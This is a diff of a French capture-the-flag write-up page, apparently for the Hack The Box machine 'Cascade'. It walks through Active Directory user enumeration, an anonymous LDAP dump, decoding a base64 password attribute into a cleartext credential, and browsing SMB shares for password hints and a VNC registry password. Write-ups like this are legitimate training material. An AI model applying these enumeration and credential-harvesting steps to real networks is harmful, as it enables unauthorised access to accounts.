+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\u</span>til
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\j</span>.wakefield
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.hickson
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\j</span>.goodhand
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>.turnbull
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\e</span>.crowe
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\b</span>.hanson
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\d</span>.burman
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\B</span>ackupSvc
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\j</span>.allen
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\i</span>.croft
+Group <span style="color:#e6db74">&#39;Group Policy Creator Owners&#39;</span> <span style="color:#f92672">(</span>RID: 520<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>dministrator
+Group <span style="color:#e6db74">&#39;Domain Guests&#39;</span> <span style="color:#f92672">(</span>RID: 514<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\C</span>ascGuest
 
 ...
-</code></pre>
+</code></pre></div><p>Il est également possible de tenter une énumération anonyme via LDAP. De cette façon, on peut récupérer plus d&rsquo;informations, notamment en ce qui concerne certains attributs des objets Active Directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ldapsearch -x -h 10.10.10.182 -D <span style="color:#e6db74">&#39;&#39;</span> -w <span style="color:#e6db74">&#39;&#39;</span> -b <span style="color:#e6db74">&#34;DC=CASCADE,DC=LOCAL&#34;</span>
+<span style="color:#75715e"># extended LDIF</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># LDAPv3</span>
+<span style="color:#75715e"># base &lt;DC=CASCADE,DC=LOCAL&gt; with scope subtree</span>
+<span style="color:#75715e"># filter: (objectclass=*)</span>
+<span style="color:#75715e"># requesting: ALL</span>
+<span style="color:#75715e">#</span>
 
-<p>Il est également possible de tenter une énumération anonyme via LDAP. De cette façon, on peut récupérer plus d&rsquo;informations, notamment en ce qui concerne certains attributs des objets Active Directory.</p>
-
-<pre><code class="language-bash">$ ldapsearch -x -h 10.10.10.182 -D '' -w '' -b &quot;DC=CASCADE,DC=LOCAL&quot;
-# extended LDIF
-#
-# LDAPv3
-# base &lt;DC=CASCADE,DC=LOCAL&gt; with scope subtree
-# filter: (objectclass=*)
-# requesting: ALL
-#
-
-# cascade.local
-dn: DC=cascade,DC=local
+<span style="color:#75715e"># cascade.local</span>
+dn: DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
 objectClass: top
 objectClass: domain
 objectClass: domainDNS
-distinguishedName: DC=cascade,DC=local
-instanceType: 5
+distinguishedName: DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+instanceType: <span style="color:#ae81ff">5</span>
 whenCreated: 20200109153132.0Z
 whenChanged: 20200411123320.0Z
-subRefs: DC=ForestDnsZones,DC=cascade,DC=local
-subRefs: DC=DomainDnsZones,DC=cascade,DC=local
-subRefs: CN=Configuration,DC=cascade,DC=local
-uSNCreated: 4099
-uSNChanged: 319567
+subRefs: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+subRefs: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+subRefs: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+uSNCreated: <span style="color:#ae81ff">4099</span>
+uSNChanged: <span style="color:#ae81ff">319567</span>
 name: cascade
-objectGUID:: BEPTb7rgSEuSvojkxZJmOA==
-creationTime: 132310820004120279
+objectGUID:: BEPTb7rgSEuSvojkxZJmOA<span style="color:#f92672">==</span>
+creationTime: <span style="color:#ae81ff">132310820004120279</span>
 forceLogoff: -9223372036854775808
 lockoutDuration: -18000000000
 lockOutObservationWindow: -18000000000
-lockoutThreshold: 0
+lockoutThreshold: <span style="color:#ae81ff">0</span>
 maxPwdAge: -9223372036854775808
-minPwdAge: 0
-minPwdLength: 5
-modifiedCountAtLastProm: 0
-nextRid: 1001
-pwdProperties: 0
-pwdHistoryLength: 0
+minPwdAge: <span style="color:#ae81ff">0</span>
+minPwdLength: <span style="color:#ae81ff">5</span>
+modifiedCountAtLastProm: <span style="color:#ae81ff">0</span>
+nextRid: <span style="color:#ae81ff">1001</span>
+pwdProperties: <span style="color:#ae81ff">0</span>
+pwdHistoryLength: <span style="color:#ae81ff">0</span>
 objectSid:: AQQAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF
-serverState: 1
-uASCompat: 1
-modifiedCount: 1
-auditingPolicy:: AAE=
-nTMixedDomain: 0
+serverState: <span style="color:#ae81ff">1</span>
+uASCompat: <span style="color:#ae81ff">1</span>
+modifiedCount: <span style="color:#ae81ff">1</span>
+auditingPolicy:: AAE<span style="color:#f92672">=</span>
+nTMixedDomain: <span style="color:#ae81ff">0</span>
 ...
-</code></pre>
-
-<p>L&rsquo;élément intéressant ici, à ne pas louper, se trouver au niveau de l&rsquo;utilisateur <code>r.thompson</code>. En effet, ce dernier dispose d&rsquo;un attribut étrange, mais surtout unique, <code>cascadeLegacyPwd</code>.</p>
-
-<pre><code class="language-bash"># Ryan Thompson, Users, UK, cascade.local
-dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+</code></pre></div><p>L&rsquo;élément intéressant ici, à ne pas louper, se trouver au niveau de l&rsquo;utilisateur <code>r.thompson</code>. En effet, ce dernier dispose d&rsquo;un attribut étrange, mais surtout unique, <code>cascadeLegacyPwd</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Ryan Thompson, Users, UK, cascade.local</span>
+dn: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
 objectClass: top
 objectClass: person
 objectClass: organizationalPerson
@@ -429,57 +437,49 @@ objectClass: user
 cn: Ryan Thompson
 sn: Thompson
 givenName: Ryan
-distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
-instanceType: 4
+distinguishedName: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+instanceType: <span style="color:#ae81ff">4</span>
 whenCreated: 20200109193126.0Z
 whenChanged: 20200323112031.0Z
 displayName: Ryan Thompson
-uSNCreated: 24610
-memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
-uSNChanged: 295010
+uSNCreated: <span style="color:#ae81ff">24610</span>
+memberOf: CN<span style="color:#f92672">=</span>IT,OU<span style="color:#f92672">=</span>Groups,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+uSNChanged: <span style="color:#ae81ff">295010</span>
 name: Ryan Thompson
-objectGUID:: LfpD6qngUkupEy9bFXBBjA==
-userAccountControl: 66048
-badPwdCount: 0
-codePage: 0
-countryCode: 0
-badPasswordTime: 132247339091081169
-lastLogoff: 0
-lastLogon: 132247339125713230
-pwdLastSet: 132230718862636251
-primaryGroupID: 513
-objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
-accountExpires: 9223372036854775807
-logonCount: 2
+objectGUID:: LfpD6qngUkupEy9bFXBBjA<span style="color:#f92672">==</span>
+userAccountControl: <span style="color:#ae81ff">66048</span>
+badPwdCount: <span style="color:#ae81ff">0</span>
+codePage: <span style="color:#ae81ff">0</span>
+countryCode: <span style="color:#ae81ff">0</span>
+badPasswordTime: <span style="color:#ae81ff">132247339091081169</span>
+lastLogoff: <span style="color:#ae81ff">0</span>
+lastLogon: <span style="color:#ae81ff">132247339125713230</span>
+pwdLastSet: <span style="color:#ae81ff">132230718862636251</span>
+primaryGroupID: <span style="color:#ae81ff">513</span>
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA<span style="color:#f92672">==</span>
+accountExpires: <span style="color:#ae81ff">9223372036854775807</span>
+logonCount: <span style="color:#ae81ff">2</span>
 sAMAccountName: r.thompson
-sAMAccountType: 805306368
+sAMAccountType: <span style="color:#ae81ff">805306368</span>
 userPrincipalName: r.thompson@cascade.local
-objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
 dSCorePropagationData: 20200126183918.0Z
 dSCorePropagationData: 20200119174753.0Z
 dSCorePropagationData: 20200119174719.0Z
 dSCorePropagationData: 20200119174508.0Z
 dSCorePropagationData: 16010101000000.0Z
-lastLogonTimestamp: 132294360317419816
-msDS-SupportedEncryptionTypes: 0
-cascadeLegacyPwd: clk0bjVldmE=
-</code></pre>
-
-<p>La chaine de caractères associée semble être encodée en base64. Une fois décodée, on récupère ce qui semble être un premier mot de passe !</p>
-
-<pre><code class="language-bash">$ echo &quot;clk0bjVldmE=&quot; | base64 -d
+lastLogonTimestamp: <span style="color:#ae81ff">132294360317419816</span>
+msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>
+cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span>
+</code></pre></div><p>La chaine de caractères associée semble être encodée en base64. Une fois décodée, on récupère ce qui semble être un premier mot de passe !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;clk0bjVldmE=&#34;</span> | base64 -d
 rY4n5eva%
-</code></pre>
-
-<p><br/></p>
-
-<h3 id="partages-smb-première-escalade">Partages SMB &amp; première escalade</h3>
-
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="partages-smb--première-escalade">Partages SMB &amp; première escalade</h3>
 <p>Disposant maintenant d&rsquo;un premier accès au domaine, on peut se tourner vers les partages SMB.
 Commençons par lister ces derniers.</p>
-
-<pre><code class="language-bash">$ smbclient -U &quot;r.thompson&quot; -L //10.10.10.182                 
-Enter WORKGROUP\r.thompson's password: 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;r.thompson&#34;</span> -L //10.10.10.182                 
+Enter WORKGROUP<span style="color:#ae81ff">\r</span>.thompson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
 
   Sharename       Type      Comment
   ---------       ----      -------
@@ -492,403 +492,335 @@ Enter WORKGROUP\r.thompson's password:
   print$          Disk      Printer Drivers
   SYSVOL          Disk      Logon server share 
 SMB1 disabled -- no workgroup available
-</code></pre>
+</code></pre></div><p>Outre les partages classiques, on remarque la présence de <code>Data</code> et <code>Audit$</code>. Il s&rsquo;avère que le partage <code>Audit$</code> n&rsquo;est pour le moment pas accessible.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;r.thompson&#34;</span> //10.10.10.182/Audit$
+Enter WORKGROUP<span style="color:#ae81ff">\r</span>.thompson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\*</span>
+</code></pre></div><p>Dans le cas du partage <code>Data</code>, il est possible de s&rsquo;y connecter et de le parcourir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;r.thompson&#34;</span> //10.10.10.182/Data
+Enter WORKGROUP<span style="color:#ae81ff">\r</span>.thompson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">27</span> 04:27:34 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">27</span> 04:27:34 <span style="color:#ae81ff">2020</span>
+  Contractors                         D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:11 <span style="color:#ae81ff">2020</span>
+  Finance                             D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:06 <span style="color:#ae81ff">2020</span>
+  IT                                  D        <span style="color:#ae81ff">0</span>  Tue Jan <span style="color:#ae81ff">28</span> 19:04:51 <span style="color:#ae81ff">2020</span>
+  Production                          D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:18 <span style="color:#ae81ff">2020</span>
+  Temps                               D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:15 <span style="color:#ae81ff">2020</span>
 
-<p>Outre les partages classiques, on remarque la présence de <code>Data</code> et <code>Audit$</code>. Il s&rsquo;avère que le partage <code>Audit$</code> n&rsquo;est pour le moment pas accessible.</p>
+    <span style="color:#ae81ff">13106687</span> blocks of size 4096. <span style="color:#ae81ff">7794590</span> blocks available
+</code></pre></div><p>Peu d&rsquo;éléments sont accessibles. Au total, 4 fichiers peuvent êtres récupérés.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\A</span>rk AD Recycle Bin<span style="color:#ae81ff">\&gt;</span> get ArkAdRecycleBin.log 
+getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\A</span>rk AD Recycle Bin<span style="color:#ae81ff">\A</span>rkAdRecycleBin.log of size <span style="color:#ae81ff">1303</span> as ArkAdRecycleBin.log <span style="color:#f92672">(</span>3.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 7.9 KiloBytes/sec<span style="color:#f92672">)</span>
 
-<pre><code class="language-bash">$ smbclient -U &quot;r.thompson&quot; //10.10.10.182/Audit$
-Enter WORKGROUP\r.thompson's password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-NT_STATUS_ACCESS_DENIED listing \*
-</code></pre>
+smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\D</span>Cs<span style="color:#ae81ff">\&gt;</span> get dcdiag.log 
+getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\D</span>Cs<span style="color:#ae81ff">\d</span>cdiag.log of size <span style="color:#ae81ff">5967</span> as dcdiag.log <span style="color:#f92672">(</span>14.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 10.2 KiloBytes/sec<span style="color:#f92672">)</span>
 
-<p>Dans le cas du partage <code>Data</code>, il est possible de s&rsquo;y connecter et de le parcourir.</p>
+smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;VNC Install.reg&#34;</span>
+getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\V</span>NC Install.reg of size <span style="color:#ae81ff">2680</span> as VNC Install.reg <span style="color:#f92672">(</span>6.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 6.3 KiloBytes/sec<span style="color:#f92672">)</span>
 
-<pre><code class="language-bash">$ smbclient -U &quot;r.thompson&quot; //10.10.10.182/Data
-Enter WORKGROUP\r.thompson's password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Mon Jan 27 04:27:34 2020
-  ..                                  D        0  Mon Jan 27 04:27:34 2020
-  Contractors                         D        0  Mon Jan 13 02:45:11 2020
-  Finance                             D        0  Mon Jan 13 02:45:06 2020
-  IT                                  D        0  Tue Jan 28 19:04:51 2020
-  Production                          D        0  Mon Jan 13 02:45:18 2020
-  Temps                               D        0  Mon Jan 13 02:45:15 2020
-
-    13106687 blocks of size 4096. 7794590 blocks available
-</code></pre>
-
-<p>Peu d&rsquo;éléments sont accessibles. Au total, 4 fichiers peuvent êtres récupérés.</p>
-
-<pre><code class="language-bash">smb: \IT\Logs\Ark AD Recycle Bin\&gt; get ArkAdRecycleBin.log 
-getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (3.1 KiloBytes/sec) (average 7.9 KiloBytes/sec)
-
-smb: \IT\Logs\DCs\&gt; get dcdiag.log 
-getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (14.1 KiloBytes/sec) (average 10.2 KiloBytes/sec)
-
-smb: \IT\Temp\s.smith\&gt; get &quot;VNC Install.reg&quot;
-getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)
-
-smb: \IT\Email Archives\&gt; get Meeting_Notes_June_2018.html 
-getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (6.0 KiloBytes/sec) (average 7.4 KiloBytes/sec)
-</code></pre>
-
-<p>Le fichier <code>Meeting_Notes_June_2018.html</code> permet de récupérer une information cruciale, la présence d&rsquo;un compte temporaire, disposant du même mot de passe que l&rsquo;administrateur et ayant été supprimé il y a quelques temps.</p>
-
-<pre><code class="language-bash">From: Steve Smith
-To: IT (Internal)
-Sent: 14 June 2018 14:07
+smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\E</span>mail Archives<span style="color:#ae81ff">\&gt;</span> get Meeting_Notes_June_2018.html 
+getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\E</span>mail Archives<span style="color:#ae81ff">\M</span>eeting_Notes_June_2018.html of size <span style="color:#ae81ff">2522</span> as Meeting_Notes_June_2018.html <span style="color:#f92672">(</span>6.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 7.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>Le fichier <code>Meeting_Notes_June_2018.html</code> permet de récupérer une information cruciale, la présence d&rsquo;un compte temporaire, disposant du même mot de passe que l&rsquo;administrateur et ayant été supprimé il y a quelques temps.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">From: Steve Smith
+To: IT <span style="color:#f92672">(</span>Internal<span style="color:#f92672">)</span>
+Sent: <span style="color:#ae81ff">14</span> June <span style="color:#ae81ff">2018</span> 14:07
 Subject: Meeting Notes
 
-For anyone that missed yesterday’s meeting (I’m looking at you Ben). Main points are below:
+For anyone that missed yesterday’s meeting <span style="color:#f92672">(</span>I’m looking at you Ben<span style="color:#f92672">)</span>. Main points are below:
 
--- New production network will be going live on Wednesday so keep an eye out for any issues.
--- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
+-- New production network will be going live on Wednesday so keep an eye out <span style="color:#66d9ef">for</span> any issues.
+-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of <span style="color:#ae81ff">2018</span> once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin <span style="color:#f92672">(</span>password is the same as the normal admin account password<span style="color:#f92672">)</span>.
 -- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.
 
 Steve
-</code></pre>
-
-<p>Le fichier <code>ArkAdRecycleBin.log</code> permet quand à lui de voir que le compte <code>ArkSvc</code> est utilisé afin de gérer le <code>Recycle Bin</code>. Les logs indiquent également que les comptes <code>Test</code> et <code>TempAdmin</code> ont bien été supprimés, ou du moins déplacés.</p>
-
-<pre><code class="language-bash">$ cat FILES/ArkAdRecycleBin.log 
-1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
-1/10/2018 15:43 [MAIN_THREAD] Validating settings...
-1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied
-1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5
-2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
-2/10/2018 15:56 [MAIN_THREAD] Validating settings...
-2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\ArkSvc
-2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
-2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
-2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0 
-8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
-8/12/2018 12:22 [MAIN_THREAD] Validating settings...
-8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\ArkSvc
-8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
-8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
-8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0
-</code></pre>
-
-<p>Le fichier <code>VNC Install.reg</code> est également très intéressant puisqu&rsquo;il s&rsquo;agit d&rsquo;un fichier de configuration VNC. Il permet notamment de récupérer un mot de passe, chiffré (&ldquo;Password&rdquo;=hex:6b,cf,2a,4b,6e,5a,ca,0f).</p>
-
-<pre><code class="language-bash">$ cat VNC\ Install.reg 
+</code></pre></div><p>Le fichier <code>ArkAdRecycleBin.log</code> permet quand à lui de voir que le compte <code>ArkSvc</code> est utilisé afin de gérer le <code>Recycle Bin</code>. Les logs indiquent également que les comptes <code>Test</code> et <code>TempAdmin</code> ont bien été supprimés, ou du moins déplacés.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat FILES/ArkAdRecycleBin.log 
+1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Validating settings...
+1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Error: Access is denied
+1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Exiting with error code <span style="color:#ae81ff">5</span>
+2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Validating settings...
+2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Running as user CASCADE<span style="color:#ae81ff">\A</span>rkSvc
+2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Moving object to AD recycle bin CN<span style="color:#f92672">=</span>Test,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Successfully moved object. New location CN<span style="color:#f92672">=</span>Test<span style="color:#ae81ff">\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Exiting with error code <span style="color:#ae81ff">0</span> 
+8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Validating settings...
+8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Running as user CASCADE<span style="color:#ae81ff">\A</span>rkSvc
+8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Moving object to AD recycle bin CN<span style="color:#f92672">=</span>TempAdmin,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Successfully moved object. New location CN<span style="color:#f92672">=</span>TempAdmin<span style="color:#ae81ff">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Exiting with error code <span style="color:#ae81ff">0</span>
+</code></pre></div><p>Le fichier <code>VNC Install.reg</code> est également très intéressant puisqu&rsquo;il s&rsquo;agit d&rsquo;un fichier de configuration VNC. Il permet notamment de récupérer un mot de passe, chiffré (&ldquo;Password&rdquo;=hex:6b,cf,2a,4b,6e,5a,ca,0f).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat VNC<span style="color:#ae81ff">\ </span>Install.reg 
 ��Windows Registry Editor Version 5.00
 
-[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+<span style="color:#f92672">[</span>HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\T</span>ightVNC<span style="color:#f92672">]</span>
 
-[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
-&quot;ExtraPorts&quot;=&quot;&quot;
-&quot;QueryTimeout&quot;=dword:0000001e
-&quot;QueryAcceptOnTimeout&quot;=dword:00000000
-&quot;LocalInputPriorityTimeout&quot;=dword:00000003
-&quot;LocalInputPriority&quot;=dword:00000000
-&quot;BlockRemoteInput&quot;=dword:00000000
-&quot;BlockLocalInput&quot;=dword:00000000
-&quot;IpAccessControl&quot;=&quot;&quot;
-&quot;RfbPort&quot;=dword:0000170c
-&quot;HttpPort&quot;=dword:000016a8
-&quot;DisconnectAction&quot;=dword:00000000
-&quot;AcceptRfbConnections&quot;=dword:00000001
